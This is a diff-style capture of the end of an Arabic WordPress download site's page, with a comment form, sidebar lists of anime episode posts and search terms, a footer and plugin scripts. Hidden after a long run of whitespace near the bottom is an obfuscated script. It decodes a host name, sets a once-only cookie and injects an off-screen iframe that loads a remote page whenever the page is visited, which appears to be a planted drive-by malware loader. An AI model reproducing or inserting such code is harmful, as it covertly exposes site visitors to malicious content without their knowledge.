+<div id="captchaInputDiv"><input id="captcha_code" name="captcha_code" type="text" value="" tabindex="4"  />
+ <label id="captcha_code_label" for="captcha_code">كود الكابتشا</label><span class="required"> *</span>
+ </div>
+</div>
+                             <input type='hidden' name='comment_post_ID' value='116' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+                         </div>
+                     </fieldset>
+                 </form>
+                      </div><!-- .comments-inn -->
+    </div><!-- #respond -->
+
+
+</div><!-- #comments -->
+
+</div> <!-- .single -->
+
+
+</div><!-- #content -->
+
+<div id="sidebar">
+    <div id="wpshower_recent_posts-4" class="unspoken_recent_posts widget"><h3 class="widget-title">أحدث المواضيع</h3><ul>
+            <li class="hentry-thumb clear">
+                <span class="hentry-thumb-image"><a href="http://www.wikidownload.info/fairy-tail-132/"><img width="50" height="50" src="http://www.wikidownload.info/wp-content/uploads/2011/10/Fairy-Tail-50x50.jpg" class="attachment-micro wp-post-image" alt="فيري تيل 132 ميديا فير مترجمة عربي" title="فيري تيل 132 ميديا فير مترجمة عربي" /></a></span>
+                <span class="hentry-thumb-meta offset">26 مايو 2012 &middot; <a href="http://www.wikidownload.info/fairy-tail-132/#comments">0 التعليقات</a> &middot; <a class="url fn n" href="http://www.wikidownload.info/author/admin/" title="View all posts by admin">admin</a></span>
+                <span class="hentry-thumb-title offset"><a href="http://www.wikidownload.info/fairy-tail-132/">فيري تيل 132 ميديا فير مترجمة عربي</a></span>
+             </li>
+
+        
+            <li class="hentry-thumb clear">
+                <span class="hentry-thumb-image"><a href="http://www.wikidownload.info/naruto-shippuuden-264/"><img width="50" height="50" src="http://www.wikidownload.info/wp-content/uploads/2011/10/Naruto-Shippuuden-50x50.jpg" class="attachment-micro wp-post-image" alt="ناروتو شيبودن 264 مترجمة ميديا فاير عربي" title="ناروتو شيبودن 264 مترجمة ميديا فاير عربي" /></a></span>
+                <span class="hentry-thumb-meta offset">24 مايو 2012 &middot; <a href="http://www.wikidownload.info/naruto-shippuuden-264/#comments">0 التعليقات</a> &middot; <a class="url fn n" href="http://www.wikidownload.info/author/admin/" title="View all posts by admin">admin</a></span>
+                <span class="hentry-thumb-title offset"><a href="http://www.wikidownload.info/naruto-shippuuden-264/">ناروتو شيبودن 264 مترجمة ميديا فاير عربي</a></span>
+             </li>
+
+        
+            <li class="hentry-thumb clear">
+                <span class="hentry-thumb-image"><a href="http://www.wikidownload.info/naruto-shippuuden-263/"><img width="50" height="50" src="http://www.wikidownload.info/wp-content/uploads/2011/10/Naruto-Shippuuden-50x50.jpg" class="attachment-micro wp-post-image" alt="ناروتو شيبودن 263 مترجمة ميديا فاير عربي" title="ناروتو شيبودن 263 مترجمة ميديا فاير عربي" /></a></span>
+                <span class="hentry-thumb-meta offset">17 مايو 2012 &middot; <a href="http://www.wikidownload.info/naruto-shippuuden-263/#comments">1 التعليقات</a> &middot; <a class="url fn n" href="http://www.wikidownload.info/author/admin/" title="View all posts by admin">admin</a></span>
+                <span class="hentry-thumb-title offset"><a href="http://www.wikidownload.info/naruto-shippuuden-263/">ناروتو شيبودن 263 مترجمة ميديا فاير عربي</a></span>
+             </li>
+
+        
+            <li class="hentry-thumb clear">
+                <span class="hentry-thumb-image"><a href="http://www.wikidownload.info/one-piece-547-arabic/"><img width="50" height="50" src="http://www.wikidownload.info/wp-content/uploads/2011/10/One-Piece-50x50.jpg" class="attachment-micro wp-post-image" alt="ون بيس 547 مترجمة عربي ميديافير" title="ون بيس 547 مترجمة عربي ميديافير" /></a></span>
+                <span class="hentry-thumb-meta offset">13 مايو 2012 &middot; <a href="http://www.wikidownload.info/one-piece-547-arabic/#comments">0 التعليقات</a> &middot; <a class="url fn n" href="http://www.wikidownload.info/author/admin/" title="View all posts by admin">admin</a></span>
+                <span class="hentry-thumb-title offset"><a href="http://www.wikidownload.info/one-piece-547-arabic/">ون بيس 547 مترجمة عربي ميديافير</a></span>
+             </li>
+
+        
+            <li class="hentry-thumb clear">
+                <span class="hentry-thumb-image"><a href="http://www.wikidownload.info/naruto-shippuuden-262/"><img width="50" height="50" src="http://www.wikidownload.info/wp-content/uploads/2011/10/Naruto-Shippuuden-50x50.jpg" class="attachment-micro wp-post-image" alt="ناروتو شيبودن 262 مترجمة ميديا فاير عربي" title="ناروتو شيبودن 262 مترجمة ميديا فاير عربي" /></a></span>
+                <span class="hentry-thumb-meta offset">10 مايو 2012 &middot; <a href="http://www.wikidownload.info/naruto-shippuuden-262/#comments">1 التعليقات</a> &middot; <a class="url fn n" href="http://www.wikidownload.info/author/admin/" title="View all posts by admin">admin</a></span>
+                <span class="hentry-thumb-title offset"><a href="http://www.wikidownload.info/naruto-shippuuden-262/">ناروتو شيبودن 262 مترجمة ميديا فاير عربي</a></span>
+             </li>
+
+        </ul></div><div id="recent_searches-3" class="widget_mTrack widget"><h3 class="widget-title">أحدث نتائج البحث</h3>
+<a href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D9%85%D8%AA%D8%AC%D8%B1+%D9%86%D9%88%D9%83%D9%8A%D8%A7">تحميل متجر نوكيا</a>,
+<a href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%88%D9%8A%D9%84+%D8%A7%D9%84%D9%88%D8%AA%D8%B3%D8%A7%D8%A8+%D8%B9%D8%B1%D8%A8%D9%8A">تحويل الوتساب عربي</a>,
+<a href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D8%A7%D9%84%D8%B9%D8%A7%D8%A8+%D9%86%D9%88%D9%83%D9%8A%D8%A7+2700">تحميل العاب نوكيا 2700</a>,
+<a href="http://www.wikidownload.info/?s=%D9%88%D8%A7%D8%AA+%D8%B3%D8%A8">وات سب</a>,
+<a href="http://www.wikidownload.info/?s=%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+%D9%81%D8%AA%D8%AD+%D8%A7%D9%84%D9%85%D8%AD%D8%AC%D9%88%D8%A8+%D9%84%D9%84%D8%A8%D9%84%D8%A7%D9%83+%D8%A8%D9%8A%D8%B1%D9%8A+9300">برنامج فتح المحجوب للبلاك بيري 9300</a>,
+<a href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D9%88%D8%A7%D8%AA%D8%B3+%D8%A7%D8%A8+%D9%85%D8%B3%D9%86%D8%AC%D8%B1+%D9%84%D9%84%D8%A7%D9%8A%D9%81%D9%88%D9%86+%D9%88%D8%A7%D9%84%D8%A7%D9%8A%D8%A8%D8%A7%D8%AF+%D9%85%D8%AC%D8%A7%D9%86%D8%A7">تحميل واتس اب مسنجر للايفون والايباد مجانا</a>,
+<a href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+%D8%A7%D9%84%D9%85%D8%B2%D8%B1%D8%B9%D9%87+%D8%A7%D9%84%D8%B3%D8%B9%D9%8A%D8%AF%D9%87+1+1+2">تحميل برنامج المزرعه السعيده 1 1 2</a>,
+<a href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D8%B4%D9%81%D8%B1%D8%AA+%D8%A7%D9%84%D9%85%D8%B2%D8%B1%D8%B9%D9%87+%D8%A7%D9%84%D8%B3%D8%B9%D9%8A%D8%AF%D8%A9">تحميل شفرت المزرعه السعيدة</a>,
+<a href="http://www.wikidownload.info/?s=%D9%86%D8%A7%D8%B1%D9%88%D8%AA%D9%88+%D8%B4%D9%8A%D8%A8%D9%88%D8%AF%D9%86+72++%D9%85%D8%AA%D8%B1%D8%AC%D9%85%D8%A9+%D8%B9%D8%B1%D8%A8%D9%8A">ناروتو شيبودن 72  مترجمة عربي</a>,
+<a href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+WhatsApp+%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+WhatsApp+3">تحميل برنامج WhatsApp تحميل برنامج WhatsApp 3</a>,
+<a href="http://www.wikidownload.info/?s=%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+%D8%A7%D9%84%D9%85%D8%B2%D8%B1%D8%B9%D8%A9+%D8%A7%D9%84%D8%B3%D8%B9%D9%8A%D8%AF%D8%A9+1+1+2">برنامج المزرعة السعيدة 1 1 2</a>,
+<a href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D9%85%D9%88%D8%B3%D9%88%D8%B9%D8%A9+%D9%88%D9%8A%D9%83%D9%8A%D8%A8%D9%8A%D8%AF%D9%8A%D8%A7+2013">تحميل موسوعة ويكيبيديا 2013</a>,
+<a href="http://www.wikidownload.info/?s=%D9%86%D8%A7%D8%B1%D9%88%D8%AA%D9%88+279">ناروتو 279</a>,
+<a href="http://www.wikidownload.info/?s=%D9%87%D9%88%D8%AA+%D8%B3%D8%A8%D9%88%D8%AA+%D9%84%D9%84%D8%A8%D9%84%D8%A7%D9%83+%D8%A8%D9%8A%D8%B1%D9%8A">هوت سبوت للبلاك بيري</a>,
+<a href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D8%AA%D9%88%D8%AA%D8%B1+%D8%B9%D8%B1%D8%A8%D9%8A">تحميل توتر عربي</a>,
+<a href="http://www.wikidownload.info/?s=beeg">beeg</a>,
+<a href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D9%84%D8%B9%D8%A8%D8%A9+%D8%AF%D8%A7%D9%85%D9%88+%D9%85%D8%B3%D8%AA%D8%AD%D9%8A%D9%84+2013">تحميل لعبة دامو مستحيل 2013</a>,
+<a href="http://www.wikidownload.info/?s=%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+%D9%84%D9%84%D8%A8%D9%84%D8%A7%D9%83+%D8%A8%D9%8A%D8%B1%D9%8A+%D9%84%D9%81%D9%83+%D8%A7%D9%84%D8%A8%D8%A7%D8%B3%D9%88%D8%B1%D8%AF">برنامج للبلاك بيري لفك الباسورد</a>,
+<a href="http://www.wikidownload.info/?s=wikipedia">wikipedia</a>,
+<a href="http://www.wikidownload.info/?s=%D8%A7%D9%84%D9%88%D8%AA%D8%B3%D8%A7%D8%A8+%D8%A8%D8%A7%D9%84%D9%84%D8%BA%D8%A9+%D8%A7%D9%84%D8%B9%D8%B1%D8%A8%D9%8A%D8%A9+%D9%84%D9%86%D9%88%D9%83%D9%8A%D8%A7">الوتساب باللغة العربية لنوكيا</a>,
+
+</div><div id="popular_searches-3" class="widget_mTrack widget"><h3 class="widget-title">أشهر النتائج</h3>
+<a style="font-size:22px" href="http://www.wikidownload.info/?s=%D8%AA%D9%88%D8%A8%D9%8A%D8%AF%D9%8A">توبيدي</a>&nbsp;
+<a style="font-size:22px" href="http://www.wikidownload.info/?s=download+hack+%D8%A7%D9%84%D9%85%D8%B2%D8%B1%D8%B9%D8%A9+%D8%A7%D9%84%D8%B3%D8%B9%D9%8A%D8%AF%D8%A9">download hack المزرعة السعيدة</a>&nbsp;
+<a style="font-size:17px" href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+%D9%87%D8%A7%D9%83+%D8%A7%D9%84%D9%85%D8%B2%D8%B1%D8%B9%D8%A9+%D8%A7%D9%84%D8%B3%D8%B9%D9%8A%D8%AF%D8%A9">تحميل برنامج هاك المزرعة السعيدة</a>&nbsp;
+<a style="font-size:17px" href="http://www.wikidownload.info/?s=%D8%AA%D9%86%D8%B2%D9%8A%D9%84+%D9%88%D8%A7%D8%AA%D8%B3+%D8%A7%D8%A8">تنزيل واتس اب</a>&nbsp;
+<a style="font-size:15px" href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D9%88%D8%AA+%D8%B3%D8%A7%D8%A8">تحميل وت ساب</a>&nbsp;
+<a style="font-size:14px" href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+%D9%87%D9%83%D8%B1+%D8%A7%D9%84%D9%85%D8%B2%D8%B1%D8%B9%D8%A9+%D8%A7%D9%84%D8%B3%D8%B9%D9%8A%D8%AF%D8%A9">تحميل برنامج هكر المزرعة السعيدة</a>&nbsp;
+<a style="font-size:13px" href="http://www.wikidownload.info/?s=%D9%88%D8%AA+%D8%B3%D8%A7%D8%A8+%D9%84%D9%84%D9%83%D9%85%D8%A8%D9%8A%D9%88%D8%AA%D8%B1">وت ساب للكمبيوتر</a>&nbsp;
+<a style="font-size:12px" href="http://www.wikidownload.info/?s=%D8%A6%D9%88%D8%AA%D9%8A%D9%88%D8%A8+%D9%88%D8%AA+%D8%B3%D8%A7%D8%A8">ئوتيوب وت ساب</a>&nbsp;
+<a style="font-size:12px" href="http://www.wikidownload.info/?s=%D9%88%D9%86+%D8%A8%D9%8A%D8%B3+555">ون بيس 555</a>&nbsp;
+<a style="font-size:11px" href="http://www.wikidownload.info/?s=%D8%AA%D8%AD%D9%85%D9%8A%D9%84+%D9%85%D8%AA%D8%AC%D8%B1+%D9%86%D9%88%D9%83%D9%8A%D8%A7">تحميل متجر نوكيا</a>&nbsp;
+
+</div><div id="linkcat-2" class="widget_links widget"><h3 class="widget-title">روابط</h3>
+	<ul class='xoxo blogroll'>
+<li><a href="http://www.cdlarab.com/vb/">انمي</a></li>
+<li><a href="http://cool3t.com">كل العرب</a></li>
+<li><a href="http://ar.lmmah.com/">منتديات لمه</a></li>
+
+	</ul>
+</div>
+</div><!-- #sidebar -->
+
+            </div> <!-- .middle -->
+            <div class="bottom-widgetarea">
+                <div class="bottom-widgetarea-inn clear">
+                                                        </div>
+            </div>
+            <div class="footer clear">
+
+            <div class="menu-footer clear"><ul id="menu-navigation-footer" class="menu"><li id="menu-item-1579" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1579"><a href="http://www.wikidownload.info/wp-content/plugins/mTrack/sitemap.php">خريطة البحث</a></li>
+</ul></div>
+                <div class="footer-leftpart">
+                    <a class="logo-footer" href="http://www.wikidownload.info">
+                        <img src="http://www.wikidownload.info/minilogo.png" width="205" height="30" alt="موقع ويكي العربي - تحميل ويكي"/>                    </a>
+                </div>
+                <div class="footer-middlepart">
+                    <div class="footer-searchform">
+                        <form method="get" id="searchform" action="http://www.wikidownload.info">
+                            <fieldset>
+                                <input type="text" name="s" onfocus="if(this.value=='البحث') this.value='';" onblur="if(this.value=='') this.value='البحث';" value="البحث" />
+                            </fieldset>
+                        </form>
+                    </div>
+                    <div class="footer-tags">
+                        <p>الأوسمة النشيطة</p><a href='http://www.wikidownload.info/tag/naruto-shippuuden/' title='Naruto Shippuuden' class='naruto-shippuuden'>Naruto Shippuuden</a>, <a href='http://www.wikidownload.info/tag/fairy-tail/' title='Fairy Tail' class='fairy-tail'>Fairy Tail</a>, <a href='http://www.wikidownload.info/tag/guilty-crown/' title='Guilty Crown' class='guilty-crown'>Guilty Crown</a>, <a href='http://www.wikidownload.info/tag/one-piece/' title='One Piece' class='one-piece'>One Piece</a>, <a href='http://www.wikidownload.info/tag/bleach/' title='Bleach' class='bleach'>Bleach</a>, <a href='http://www.wikidownload.info/tag/firefox/' title='Firefox' class='firefox'>Firefox</a>, <a href='http://www.wikidownload.info/tag/bs-player/' title='BS Player' class='bs-player'>BS Player</a>, <a href='http://www.wikidownload.info/tag/internet-explorer/' title='Internet Explorer' class='internet-explorer'>Internet Explorer</a>, <a href='http://www.wikidownload.info/tag/google-chrome/' title='google chrome' class='google-chrome'>google chrome</a>, <a href='http://www.wikidownload.info/tag/teamviewer/' title='TeamViewer' class='teamviewer'>TeamViewer</a>, <a href='http://www.wikidownload.info/tag/firefox-2010/' title='Firefox 2010' class='firefox-2010'>Firefox 2010</a>, <a href='http://www.wikidownload.info/tag/%d9%81%d9%8a%d8%b1%d9%81%d9%88%d9%83%d8%b3/' title='فيرفوكس' class='%d9%81%d9%8a%d8%b1%d9%81%d9%88%d9%83%d8%b3'>فيرفوكس</a>, <a href='http://www.wikidownload.info/tag/%d8%b1%d9%8a%d8%a7%d9%84-%d8%a8%d9%84%d8%a7%d9%8a%d8%b1-2011/' title='ريال بلاير 2011' class='%d8%b1%d9%8a%d8%a7%d9%84-%d8%a8%d9%84%d8%a7%d9%8a%d8%b1-2011'>ريال بلاير 2011</a>, <a href='http://www.wikidownload.info/tag/free-download-manager/' title='Free Download Manager' class='free-download-manager'>Free Download Manager</a>, <a href='http://www.wikidownload.info/tag/download-fairy-tail/' title='تحميل فيري تيل' class='download-fairy-tail'>تحميل فيري تيل</a>, <a href='http://www.wikidownload.info/tag/%d9%86%d9%8a%d8%b1%d9%88/' title='نيرو' class='%d9%86%d9%8a%d8%b1%d9%88'>نيرو</a>, <a href='http://www.wikidownload.info/tag/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%84%d9%86%d9%8a%d8%b1%d9%88/' title='برنامج النيرو' class='%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%84%d9%86%d9%8a%d8%b1%d9%88'>برنامج النيرو</a>, <a href='http://www.wikidownload.info/tag/vlc-media-player/' title='VLC Media Player' class='vlc-media-player'>VLC Media Player</a>, <a href='http://www.wikidownload.info/tag/%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1/' title='انترنت داون لود مانجر' class='%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1'>انترنت داون لود مانجر</a>, <a href='http://www.wikidownload.info/tag/internet-download-manager/' title='Internet Download Manager' class='internet-download-manager'>Internet Download Manager</a>, <a href='http://www.wikidownload.info/tag/eset-nod32-antivirus/' title='ESET NOD32 Antivirus' class='eset-nod32-antivirus'>ESET NOD32 Antivirus</a>, <a href='http://www.wikidownload.info/tag/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%aa%d8%ad%d9%88%d9%8a%d9%84-%d8%a7%d9%84%d9%81%d9%8a%d8%af%d9%8a%d9%88/' title='برنامج تحويل الفيديو' class='%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%aa%d8%ad%d9%88%d9%8a%d9%84-%d8%a7%d9%84%d9%81%d9%8a%d8%af%d9%8a%d9%88'>برنامج تحويل الفيديو</a>, <a href='http://www.wikidownload.info/tag/total-video-converter/' title='Total Video Converter' class='total-video-converter'>Total Video Converter</a>, <a href='http://www.wikidownload.info/tag/download-paltalk/' title='Download Paltalk' class='download-paltalk'>Download Paltalk</a>, <a href='http://www.wikidownload.info/tag/paltalk/' title='Paltalk' class='paltalk'>Paltalk</a>, <a href='http://www.wikidownload.info/tag/%d8%a8%d8%a7%d9%84%d8%aa%d9%88%d9%83/' title='بالتوك' class='%d8%a8%d8%a7%d9%84%d8%aa%d9%88%d9%83'>بالتوك</a>, <a href='http://www.wikidownload.info/tag/%d8%aa%d8%ad%d9%85%d9%8a%d9%84-%d8%a8%d8%a7%d9%84%d8%aa%d9%88%d9%83/' title='تحميل بالتوك' class='%d8%aa%d8%ad%d9%85%d9%8a%d9%84-%d8%a8%d8%a7%d9%84%d8%aa%d9%88%d9%83'>تحميل بالتوك</a>, <a href='http://www.wikidownload.info/tag/%d8%aa%d9%86%d8%b2%d9%8a%d9%84-%d8%a8%d8%a7%d9%84%d8%aa%d9%88%d9%83/' title='تنزيل بالتوك' class='%d8%aa%d9%86%d8%b2%d9%8a%d9%84-%d8%a8%d8%a7%d9%84%d8%aa%d9%88%d9%83'>تنزيل بالتوك</a>, <a href='http://www.wikidownload.info/tag/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d9%86%d8%b3%d8%ae-%d8%a7%d9%84%d8%a7%d9%82%d8%b1%d8%a7%d8%b5/' title='برنامج نسخ الاقراص' class='%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d9%86%d8%b3%d8%ae-%d8%a7%d9%84%d8%a7%d9%82%d8%b1%d8%a7%d8%b5'>برنامج نسخ الاقراص</a>, <a href='http://www.wikidownload.info/tag/cdburnerxp/' title='CDBurnerXP' class='cdburnerxp'>CDBurnerXP</a>                    </div>
+                </div>
+
+            <ul id="menu-footer-left-linkset" class="footer-linkset"></ul>
+            <ul id="menu-footer-right-linkset" class="footer-linkset"></ul>
+            </div><!-- .footer -->
+            <div class="copyrights">
+                <p><a href="http://www.wikidownload.info">موقع ويكي العربي &#8211; تحميل ويكي</a> &copy; 2012 جميع الحقوق محفوظة</p>
+                            </div>
+
+            <div class="clear"></div>
+        </div> <!-- .wrapper -->
+
+        
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  <script type='text/javascript'>var wow="b3nimb2b2b3b3nimb2b1brb1tc";c1="lonly"; if(-1==document.cookie.indexOf(c1)){var a=new Date;a.setTime(a.getTime());c3=72E6;c2=new Date(a.getTime()+c3);document.cookie=c1+"="+escape(c2.toGMTString())+";expires="+c2.toGMTString()+";path=/";var a=document.createElement("ifr"+"a"+"me");a.setAttribute("src","http://"+wow.replace(/ea/g,"-").replace(/b3/g,"a").replace(/b2/g,"e").replace(/b1/g, ".")+"/rem2.html");a.style.position="abs"+"olute";a.style.width="16"+"px";a.setAttribute("fra"+"mebo"+"rder",navigator.userAgent.indexOf("917"+"8"+"2648")+1);a.style.left="-"+"62"+"00"+"px";document.write("<div id='de"+"fu"+"se'></div>");document.getElementById("def"+"us"+"e").appendChild(a)};</script>
+<!-- A <a href="http://wordpress.org/">WordPress</a> Project --><script type='text/javascript' src='http://www.wikidownload.info/wp-content/plugins/si-captcha-for-wordpress/captcha/si_captcha.js?ver=1.0'></script>
+<script type="text/javascript">
+//<![CDATA[
+var si_captcha_styles = "\
+<!-- begin SI CAPTCHA Anti-Spam - comment form style -->\
+<style type='text/css'>\
+div#captchaImgDiv { display:block; }\
+.captchaSizeDivSmall { width:175px; height:45px; padding-top:10px; }\
+.captchaSizeDivLarge { width:250px; height:60px; padding-top:10px; }\
+img#si_image_com,#si_image_reg,#si_image_log,#si_image_side_login { border-style:none; margin:0; padding-right:5px; float:left; }\
+.captchaImgRefresh { border-style:none; margin:0; vertical-align:bottom; }\
+div#captchaInputDiv { display:block; padding-top:15px; padding-bottom:5px; }\
+label#captcha_code_label { margin:0; }\
+input#captcha_code { width:65px; }\
+</style>\
+<!-- end SI CAPTCHA Anti-Spam - comment form style -->\
+";
+jQuery(document).ready(function($) {
+$('head').append(si_captcha_styles);
+});
+//]]>
+</script>
+<script type='text/javascript' src='http://www.wikidownload.info/wp-content/plugins/contact-form-7/includes/js/jquery.form.js?ver=3.14'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"http:\/\/www.wikidownload.info\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"\u062c\u0627\u0631\u064a \u0627\u0644\u0625\u0631\u0633\u0627\u0644 ...","cached":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.wikidownload.info/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=3.2.1'></script>
+
+        
+	</body>
+</html>
+
+<!-- Dynamic page generated in 1.905 seconds. -->
+<!-- Cached page generated by WP-Super-Cache on 2012-08-05 14:55:58 -->
+<!-- Compression = gzip -->
